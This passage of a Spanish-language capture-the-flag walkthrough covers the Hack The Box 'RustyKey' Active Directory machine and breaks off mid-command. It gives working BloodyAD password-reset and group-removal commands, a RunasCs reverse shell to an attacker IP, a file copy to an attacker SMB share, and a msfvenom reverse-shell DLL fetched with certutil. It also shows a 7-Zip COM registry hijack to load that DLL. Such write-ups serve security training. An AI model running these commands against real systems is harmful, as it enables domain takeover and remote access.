+</span></span><span class="line"><span class="cl">INFO: Found <span class="m">1</span> domains
+</span></span><span class="line"><span class="cl">INFO: Found <span class="m">1</span> domains in the forest
+</span></span><span class="line"><span class="cl">INFO: Found <span class="m">16</span> computers
+</span></span><span class="line"><span class="cl">INFO: Connecting to LDAP server: DC.rustykey.htb
+</span></span><span class="line"><span class="cl">INFO: Found <span class="m">12</span> users
+</span></span><span class="line"><span class="cl">INFO: Found <span class="m">58</span> groups
+</span></span><span class="line"><span class="cl">INFO: Found <span class="m">2</span> gpos
+</span></span><span class="line"><span class="cl">INFO: Found <span class="m">10</span> ous
+</span></span><span class="line"><span class="cl">INFO: Found <span class="m">19</span> containers
+</span></span><span class="line"><span class="cl">INFO: Found <span class="m">0</span> trusts
+</span></span><span class="line"><span class="cl">INFO: Starting computer enumeration with <span class="m">10</span> workers
+</span></span><span class="line"><span class="cl">INFO: Querying computer:
+</span></span><span class="line"><span class="cl">INFO: Querying computer:
+</span></span><span class="line"><span class="cl">INFO: Querying computer:
+</span></span><span class="line"><span class="cl">INFO: Querying computer:
+</span></span><span class="line"><span class="cl">INFO: Querying computer:
+</span></span><span class="line"><span class="cl">INFO: Querying computer:
+</span></span><span class="line"><span class="cl">INFO: Querying computer:
+</span></span><span class="line"><span class="cl">INFO: Querying computer:
+</span></span><span class="line"><span class="cl">INFO: Querying computer:
+</span></span><span class="line"><span class="cl">INFO: Querying computer:
+</span></span><span class="line"><span class="cl">INFO: Querying computer:
+</span></span><span class="line"><span class="cl">INFO: Querying computer:
+</span></span><span class="line"><span class="cl">INFO: Querying computer:
+</span></span><span class="line"><span class="cl">INFO: Querying computer:
+</span></span><span class="line"><span class="cl">INFO: Querying computer:
+</span></span><span class="line"><span class="cl">INFO: Querying computer: dc.rustykey.htb
+</span></span><span class="line"><span class="cl">INFO: Done in 00M 21S
+</span></span><span class="line"><span class="cl">INFO: Compressing output into 20250701191109_bloodhound.zip
+</span></span></code></pre></div><h2 id="abusando-de-permisos-addself-para-añadir-un-equipo-al-grupo-helpdesk--bloodyad">Abusando de permisos AddSelf para añadir un equipo al grupo HELPDESK- BloodyAD<a hidden class="anchor" aria-hidden="true" href="#abusando-de-permisos-addself-para-añadir-un-equipo-al-grupo-helpdesk--bloodyad">#</a></h2>
+<p>Si ahora miramos los permisos que contiene el equipo <code>IT-COMPUTER3</code>, vemos que tiene permisos <code>AddSelf</code> sobre el grupo <code>HelpDesk</code> .</p>
+<p><img alt="Rustykey Machine 2" loading="lazy" src="/img/rustykey/rustykey_machine_2.png"></p>
+<p>Con lo cual lanzamos con <code>BloodyAD</code> el comando usando la opción <strong>-k</strong> para autenticarse a través de kerberos.</p>
+<blockquote>
+<p>Al escribir el nombre del equipo IT-COMPUTER, le añadimos el carácter &ldquo;$&rdquo; para interprete este usuario como un equipo del dominio, sino, nos interpertara IT-COMPUTER3 como un usuario y nos dará error.</p>
+</blockquote>
+<p>Ahora si miramos los permisos del grupo HelpDesk, vemos que tiene permisos <code>ForceChangePassword</code> en todos los usuarios, <code>GenericWrite</code> sobre DD.ALI y permisos <code>AddMember</code> sobre el grupo Protected Objects.</p>
+<p><img alt="Rustykey Machine 3" loading="lazy" src="/img/rustykey/rustykey_machine_3.png"></p>
+<h2 id="abusando-de-permisos-forcechangepassword---bloodyad">Abusando de permisos ForceChangePassword - BloodyAD<a hidden class="anchor" aria-hidden="true" href="#abusando-de-permisos-forcechangepassword---bloodyad">#</a></h2>
+<p>Volviendo a hacer uso de BloodyAD, cambiamos la contraseña del usuario bb.morgan.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ bloodyAD --host DC.rustykey.htb -d rustykey.htb -k -u <span class="s1">&#39;IT-COMPUTER3$&#39;</span> -p <span class="s1">&#39;Rusty88!&#39;</span> <span class="nb">set</span> password <span class="s1">&#39;bb.morgan&#39;</span> <span class="s1">&#39;Password88!&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Password changed successfully!
+</span></span></code></pre></div><p>Ahora una vez cambio la contraseña del usuario nos encontramos el siguiente error al ejecutar la comprobación de credenciales.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ nxc ldap 10.10.11.75 -u <span class="s1">&#39;bb.morgan&#39;</span> -p <span class="s1">&#39;Password88!&#39;</span> -k
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.75     <span class="m">389</span>    DC               <span class="o">[</span>*<span class="o">]</span> None <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:rustykey.htb<span class="o">)</span>
+</span></span><span class="line"><span class="cl">LDAP        10.10.11.75     <span class="m">389</span>    DC               <span class="o">[</span>-<span class="o">]</span> rustykey.htb<span class="se">\b</span>b.morgan:Password88! KDC_ERR_ETYPE_NOSUPP
+</span></span></code></pre></div><p>Esto sucede porque estamos usando un <code>Usuario Protegido</code>, ya que las restricciones de seguridad bloquean este algoritmo.</p>
+<h2 id="quitando-grupo-protected-objects-del-grupo-it---bloodyad">Quitando grupo Protected Objects del grupo IT - BloodyAD<a hidden class="anchor" aria-hidden="true" href="#quitando-grupo-protected-objects-del-grupo-it---bloodyad">#</a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ bloodyAD --host DC.rustykey.htb -d rustykey.htb -k -u <span class="s1">&#39;IT-COMPUTER3$&#39;</span> -p <span class="s1">&#39;Rusty88!&#39;</span> <span class="nb">set</span> password <span class="s1">&#39;bb.morgan&#39;</span> <span class="s1">&#39;Password88!&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Password changed successfully!
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ bloodyAD --host DC.rustykey.htb -d rustykey.htb -k -u <span class="s1">&#39;IT-COMPUTER3$&#39;</span> -p <span class="s1">&#39;Rusty88!&#39;</span> remove groupMember <span class="s2">&#34;PROTECTED OBJECTS&#34;</span> IT
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> IT removed from PROTECTED OBJECTS
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ nxc ldap DC.rustykey.htb -u <span class="s1">&#39;bb.morgan&#39;</span> -p <span class="s1">&#39;Password88!&#39;</span> -k
+</span></span><span class="line"><span class="cl">LDAP        DC.rustykey.htb <span class="m">389</span>    DC               <span class="o">[</span>*<span class="o">]</span> None <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:rustykey.htb<span class="o">)</span>
+</span></span><span class="line"><span class="cl">LDAP        DC.rustykey.htb <span class="m">389</span>    DC               <span class="o">[</span>+<span class="o">]</span> rustykey.htb<span class="se">\b</span>b.morgan:Password88!
+</span></span></code></pre></div><p>Ahora nos generamos un TGT para poder entrar a través de winrm</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ getTGT.py rustykey.htb/bb.morgan:<span class="s1">&#39;Password88!&#39;</span> -dc-ip 10.10.11.75
+</span></span><span class="line"><span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving ticket in bb.morgan.ccache
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">❯ <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>/home/borhub/Workspace/HTB/RustyKey/CONTENT/bb.morgan.ccache
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">❯ evil-winrm -i DC.rustykey.htb -r rustykey.htb
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Evil-WinRM shell v3.7
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Warning: Remote path completions is disabled due to ruby limitation: undefined method <span class="s1">&#39;quoting_detection_proc&#39;</span> <span class="k">for</span> module Reline
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\b</span>b.morgan<span class="se">\D</span>ocuments&gt; <span class="nb">type</span> ../Desktop/user.txt
+</span></span><span class="line"><span class="cl">70255a6359bebcea23de7e9988732180
+</span></span></code></pre></div><h1 id="pivoting-a-usuario-mmturner">Pivoting a usuario MM.TURNER<a hidden class="anchor" aria-hidden="true" href="#pivoting-a-usuario-mmturner">#</a></h1>
+<p>Mirando los archivos que el usuario <code>bb.morgan</code> tiene en sus carpetas vemos que en Desktop tiene un archivo llamado <code>internal.pdf</code>. Con lo cual nos lo descargamos a local para así poder trabajar con el.</p>
+<h2 id="smb-file-upload">SMB File Upload<a hidden class="anchor" aria-hidden="true" href="#smb-file-upload">#</a></h2>
+<p>Nos abrimos un servidor SMB en nuestra máquina atacante con <code>smbserver</code> y luego desde la máquina windows copiamos el archivo objetivo al servidor SMB.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#Montar servidor SMB</span>
+</span></span><span class="line"><span class="cl">❯ sudo smbserver.py smbFolder <span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span> -smb2support
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> contraseña para borhub:
+</span></span><span class="line"><span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Config file parsed
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Callback added <span class="k">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Callback added <span class="k">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Config file parsed
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Config file parsed
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#Copiar archivo de máquina Windows al servidor SMB de mi máquina atacante</span>
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\b</span>b.morgan<span class="se">\D</span>esktop&gt; copy C:<span class="se">\U</span>sers<span class="se">\b</span>b.morgan<span class="se">\D</span>esktop<span class="se">\i</span>nternal.pdf <span class="se">\\</span>10.10.15.254<span class="se">\s</span>mbFolder<span class="se">\i</span>nternal.pdf
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#Recibimos el archivo en el servidor SMB</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Incoming connection <span class="o">(</span>10.10.11.75,52360<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\,</span>DC<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> User DC<span class="se">\ </span>authenticated successfully
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> :::00::aaaaaaaaaaaaaaaa
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Connecting Share<span class="o">(</span>1:IPC$<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Connecting Share<span class="o">(</span>2:smbFolder<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Disconnecting Share<span class="o">(</span>1:IPC$<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Disconnecting Share<span class="o">(</span>2:smbFolder<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Closing down connection <span class="o">(</span>10.10.11.75,52360<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Remaining connections <span class="o">[]</span>
+</span></span></code></pre></div><p><img alt="Rustykey Machine 4" loading="lazy" src="/img/rustykey/rustykey_machine_4.png"></p>
+<p>En el pdf se indica que al grupo Support se le han añadido un acceso extendido temporal para hacer pruebas a través de los equipos compartidos. También indica que es para solucionar los problemas reportados con la extracción/compresión reportada por los grupos Finance y IT.</p>
+<p>Sabiendo lo anterior, y visto que con el usuario bb.morgan no podemos hacer nada, intentamos crearnos un tgt y abrirnos una shell con evilwinrm usando al usuario ee.reed. Pero esto nos da un error de que las credenciales de ee.reed están expiradas.</p>
+<h2 id="shell-como-eereed---runascsexe">Shell como ee.reed - RunasCs.exe<a hidden class="anchor" aria-hidden="true" href="#shell-como-eereed---runascsexe">#</a></h2>
+<ul>
+<li><code>   RunasCS</code> es una herramienta que nos permite ejecutar diferentes procesos con los permisos obtenidos de las credenciales que le indicamos en el la linea de comando.</li>
+</ul>
+<p>Para empezar, vamos a subir a la máquina mediante <code>upload</code> el archivo <code>RunasCs.exe</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\b</span>b.morgan<span class="se">\D</span>ocuments&gt; upload ./RunasCs/RunasCs.exe
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Info: Uploading /home/borhub/Workspace/HTB/RustyKey/CONTENT/RunasCs/RunasCs.exe to C:<span class="se">\U</span>sers<span class="se">\b</span>b.morgan<span class="se">\D</span>ocuments<span class="se">\R</span>unasCs.exe
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Data: <span class="m">68948</span> bytes of <span class="m">68948</span> bytes copied
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Info: Upload successful!
+</span></span></code></pre></div><p>Ahora necesitamos cambiar la contraseña del usuario ee.reed y luego retirar el <code>grupo SUPPORT</code> de <code>PROTECTED OBJECTS</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ bloodyAD --host DC.rustykey.htb -d rustykey.htb -k -u <span class="s1">&#39;IT-COMPUTER3$&#39;</span> -p <span class="s1">&#39;Rusty88!&#39;</span> <span class="nb">set</span> password <span class="s1">&#39;ee.reed&#39;</span> <span class="s1">&#39;Password88!&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Password changed successfully!
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ bloodyAD --host DC.rustykey.htb -d rustykey.htb -k -u <span class="s1">&#39;IT-COMPUTER3$&#39;</span> -p <span class="s1">&#39;Rusty88!&#39;</span> remove groupMember <span class="s2">&#34;PROTECTED OBJECTS&#34;</span> SUPPORT
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> SUPPORT removed from PROTECTED OBJECTS
+</span></span></code></pre></div><p>Ahora ya con el grupo removido, ejecutamos <code>runascs</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\b</span>b.morgan<span class="se">\D</span>ocuments&gt; .<span class="se">\R</span>unasCs.exe ee.reed Password88! powershell.exe -r 10.10.15.254:4444
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Warning: User profile directory <span class="k">for</span> user ee.reed does not exists. Use --force-profile <span class="k">if</span> you want to force the creation.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Warning: The logon <span class="k">for</span> user <span class="s1">&#39;ee.reed&#39;</span> is limited. Use the flag combination --bypass-uac and --logon-type <span class="s1">&#39;8&#39;</span> to obtain a more privileged token.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Running in session <span class="m">0</span> with process <span class="k">function</span> CreateProcessWithLogonW<span class="o">()</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Using Station<span class="se">\D</span>esktop: Service-0x0-c601a$<span class="se">\D</span>efault
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Async process <span class="s1">&#39;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&#39;</span> with pid <span class="m">2152</span> created in background.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">❯ nc -lvnp <span class="m">4444</span>
+</span></span><span class="line"><span class="cl">Connection from 10.10.11.75:51076
+</span></span><span class="line"><span class="cl">Windows PowerShell
+</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>C<span class="o">)</span> Microsoft Corporation. All rights reserved.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; whoami
+</span></span><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">rustykey<span class="se">\e</span>e.reed
+</span></span></code></pre></div><h2 id="comprobar-claves-de-registro---reg-query">Comprobar claves de registro - Reg query<a hidden class="anchor" aria-hidden="true" href="#comprobar-claves-de-registro---reg-query">#</a></h2>
+<p>Una vez con la shell reed establecida, vamos a proceder a buscar claves de registro relacionadas con las utilidades de archivado que el documento .pdf menciona.</p>
+<p>Usando <code>reg query</code> consultamos el <code>registro del sistema</code>, esta vez le indicamos que que nos busque los manejadores de menús contextuales o <code>ContextMenuHandlers</code> que son los elementos que aparecen al hacer clic derecho en cualquier archivo.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span> <span class="n">reg</span> <span class="n">query</span> <span class="s2">&#34;HKCR\*\shellex\ContextMenuHandlers&#34;</span> <span class="p">/</span><span class="n">s</span>
+</span></span><span class="line"><span class="cl"><span class="n">reg</span> <span class="n">query</span> <span class="s2">&#34;HKCR\*\shellex\ContextMenuHandlers&#34;</span> <span class="p">/</span><span class="n">s</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">HKEY_CLASSES_ROOT</span><span class="p">\*\</span><span class="n">shellex</span><span class="p">\</span><span class="n">ContextMenuHandlers</span><span class="p">\</span><span class="mf">7</span><span class="n">-Zip</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="k">Default</span><span class="p">)</span>    <span class="n">REG_SZ</span>    <span class="p">{</span><span class="n">23170F69</span><span class="p">-</span><span class="n">40C1</span><span class="p">-</span><span class="n">278A</span><span class="p">-</span><span class="mf">1000</span><span class="p">-</span><span class="mf">000100020000</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">HKEY_CLASSES_ROOT</span><span class="p">\*\</span><span class="n">shellex</span><span class="p">\</span><span class="n">ContextMenuHandlers</span><span class="p">\</span><span class="n">ModernSharing</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="k">Default</span><span class="p">)</span>    <span class="n">REG_SZ</span>    <span class="p">{</span><span class="n">e2bf9676</span><span class="p">-</span><span class="n">5f8f</span><span class="p">-</span><span class="n">435c</span><span class="p">-</span><span class="n">97eb</span><span class="p">-</span><span class="n">11607a5bedf7</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">HKEY_CLASSES_ROOT</span><span class="p">\*\</span><span class="n">shellex</span><span class="p">\</span><span class="n">ContextMenuHandlers</span><span class="p">\</span><span class="n">Open</span> <span class="n">With</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="k">Default</span><span class="p">)</span>    <span class="n">REG_SZ</span>    <span class="p">{</span><span class="n">09799AFB-AD67</span><span class="p">-</span><span class="n">11d1-ABCD</span><span class="p">-</span><span class="n">00C04FC30936</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">HKEY_CLASSES_ROOT</span><span class="p">\*\</span><span class="n">shellex</span><span class="p">\</span><span class="n">ContextMenuHandlers</span><span class="p">\</span><span class="n">Open</span> <span class="n">With</span> <span class="n">EncryptionMenu</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="k">Default</span><span class="p">)</span>    <span class="n">REG_SZ</span>    <span class="p">{</span><span class="nb">A470F8CF-A1E8</span><span class="p">-</span><span class="n">4f65</span><span class="p">-</span><span class="mf">8335</span><span class="p">-</span><span class="n">227475AA5C46</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">HKEY_CLASSES_ROOT</span><span class="p">\*\</span><span class="n">shellex</span><span class="p">\</span><span class="n">ContextMenuHandlers</span><span class="p">\</span><span class="n">Sharing</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="k">Default</span><span class="p">)</span>    <span class="n">REG_SZ</span>    <span class="p">{</span><span class="n">f81e9010</span><span class="p">-</span><span class="n">6ea4</span><span class="p">-</span><span class="n">11ce-a7ff</span><span class="p">-</span><span class="n">00aa003ca9f6</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">HKEY_CLASSES_ROOT</span><span class="p">\*\</span><span class="n">shellex</span><span class="p">\</span><span class="n">ContextMenuHandlers</span><span class="p">\{</span><span class="n">90AA3A4E</span><span class="p">-</span><span class="n">1CBA</span><span class="p">-</span><span class="mf">4233</span><span class="n">-B8BB</span><span class="p">-</span><span class="n">535773D48449</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="k">Default</span><span class="p">)</span>    <span class="n">REG_SZ</span>    <span class="n">Taskband</span> <span class="n">Pin</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">HKEY_CLASSES_ROOT</span><span class="p">\*\</span><span class="n">shellex</span><span class="p">\</span><span class="n">ContextMenuHandlers</span><span class="p">\{</span><span class="nb">a2a9545d-a0c2</span><span class="p">-</span><span class="n">42b4</span><span class="p">-</span><span class="mf">9708</span><span class="n">-a0b2badd77c8</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="k">Default</span><span class="p">)</span>    <span class="n">REG_SZ</span>    <span class="nb">Start </span><span class="n">Menu</span> <span class="n">Pin</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Public</span><span class="p">&gt;</span> <span class="n">reg</span> <span class="n">query</span> <span class="s2">&#34;HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32&#34;</span> <span class="p">/</span><span class="n">ve</span>
+</span></span><span class="line"><span class="cl"><span class="n">reg</span> <span class="n">query</span> <span class="s2">&#34;HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32&#34;</span> <span class="p">/</span><span class="n">ve</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">HKEY_CLASSES_ROOT</span><span class="p">\</span><span class="n">CLSID</span><span class="p">\{</span><span class="n">23170F69</span><span class="p">-</span><span class="n">40C1</span><span class="p">-</span><span class="n">278A</span><span class="p">-</span><span class="mf">1000</span><span class="p">-</span><span class="mf">000100020000</span><span class="p">}\</span><span class="n">InprocServer32</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="k">Default</span><span class="p">)</span>    <span class="n">REG_SZ</span>    <span class="n">C:</span><span class="p">\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="mf">7</span><span class="n">-Zip</span><span class="p">\</span><span class="mf">7</span><span class="n">-zip</span><span class="p">.</span><span class="py">dll</span>
+</span></span></code></pre></div><h2 id="generar-dll-maliciosa---msfvenom">Generar DLL maliciosa - msfvenom<a hidden class="anchor" aria-hidden="true" href="#generar-dll-maliciosa---msfvenom">#</a></h2>
+<p>Una vez hecha todas las comprobaciones vamos a generar una <code>dll maliciosa</code>, para que en el momento de que sea ejecutada cargue una reverse shell a nuestro puerto en escucha.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ msfvenom -p windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.15.254 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f dll -o malicious.dll
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x64 from the payload
+</span></span><span class="line"><span class="cl">No encoder specified, outputting raw payload
+</span></span><span class="line"><span class="cl">Payload size: <span class="m">460</span> bytes
+</span></span><span class="line"><span class="cl">Final size of dll file: <span class="m">9216</span> bytes
+</span></span><span class="line"><span class="cl">Saved as: malicious.dll
+</span></span></code></pre></div><p>Ahora nos pasamos con <code>certutil</code> el archivo malicioso a la máquina victima.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ python3 -m http.server <span class="m">8080</span>
+</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port <span class="m">8080</span> <span class="o">(</span>http://0.0.0.0:8080/<span class="o">)</span> ...
+</span></span><span class="line"><span class="cl">10.10.11.75 - - <span class="o">[</span>06/Jul/2025 08:14:49<span class="o">]</span> <span class="s2">&#34;GET /malicious.dll HTTP/1.1&#34;</span> <span class="m">200</span> -
+</span></span><span class="line"><span class="cl">10.10.11.75 - - <span class="o">[</span>06/Jul/2025 08:14:49<span class="o">]</span> <span class="s2">&#34;GET /malicious.dll HTTP/1.1&#34;</span> <span class="m">200</span> -
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">certutil -urlcache -split -f http://&lt;TU_IP&gt;/malicious.dll C:<span class="se">\U</span>sers<span class="se">\P</span>ublic<span class="se">\m</span>alicious.dll
+</span></span></code></pre></div><h2 id="modificar-claves-de-registro-dll-hijacking---reg-add">Modificar claves de registro (DLL Hijacking) - Reg add<a hidden class="anchor" aria-hidden="true" href="#modificar-claves-de-registro-dll-hijacking---reg-add">#</a></h2>
+<p>Ahora hijackeamos el menú contextual de 7zip con reg add para ejecutar código arbitrario:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Public</span><span class="p">&gt;</span> <span class="n">reg</span> <span class="n">add</span> <span class="s2">&#34;HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32&#34;</span> <span class="p">/</span><span class="n">ve</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_SZ</span> <span class="p">/</span><span class="n">d</span> <span class="s2">&#34;C:\Users\Public\malicious.dll&#34;</span> <span class="p">/</span><span class="n">f</span>
+</span></span><span class="line"><span class="cl"><span class="n">reg</span> <span class="n">add</span> <span class="s2">&#34;HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32&#34;</span> <span class="p">/</span><span class="n">ve</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_SZ</span> <span class="p">/</span><span class="n">d</span> <span class="s2">&#34;C:\Users\Public\malicious.dll&#34;</span> <span class="p">/</span><span class="n">f</span>
+</span></span><span class="line"><span class="cl"><span class="n">The</span> <span class="n">operation</span> <span class="n">completed</span> <span class="n">successfully</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">#Revisamos que se ha cambiado el dll por el nuestro malicioso</span>
+</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Public</span><span class="p">&gt;</span> <span class="n">reg</span> <span class="n">query</span> <span class="s2">&#34;HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32&#34;</span> <span class="p">/</span><span class="n">ve</span>
+</span></span><span class="line"><span class="cl"><span class="n">reg</span> <span class="n">query</span> <span class="s2">&#34;HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32&#34;</span> <span class="p">/</span><span class="n">ve</span>
+</span></span><span class="line"><span class="cl">
